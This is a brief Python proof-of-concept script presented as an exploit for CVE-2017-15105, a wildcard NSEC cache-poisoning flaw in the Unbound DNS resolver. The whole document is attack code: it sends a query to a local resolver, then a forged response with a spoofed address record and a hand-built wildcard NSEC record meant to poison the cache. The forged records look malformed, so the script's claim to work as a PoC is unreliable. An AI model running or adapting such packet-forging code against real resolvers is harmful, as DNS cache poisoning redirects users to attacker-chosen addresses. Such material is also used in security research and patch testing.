#!/usr/bin/env python3
"""
PoC: CVE-2017-15105 - Unbound 1.6.4 wildcard NSEC cache poisoning
Trigger: Forged response with wildcard NSEC covering target domain
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# First send query to create pending request
hdr = struct.pack(">HHHHHH", 0xABCD, 0x0100, 1, 0, 0, 0)
qry = b"\x07example\x03com\x00\x00\x01\x00\x01"
s.sendto(hdr + qry, ("localhost", 5055))
# Forged response with wildcard NSEC to poison cache
resp_hdr = struct.pack(">HHHHHH", 0xABCD, 0x8400, 1, 1, 1, 0)
ans = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x0e\x10\x00\x04\xc0\xa8\x01\x01"
nsec = b"\xc0\x0c\x00\x2f\x00\x01\x00\x00\x0e\x10\x00\x06\x01\x2a\xc0\x0c\x00\x01"
s.sendto(resp_hdr + qry + ans + nsec, ("localhost", 5055))
s.close()
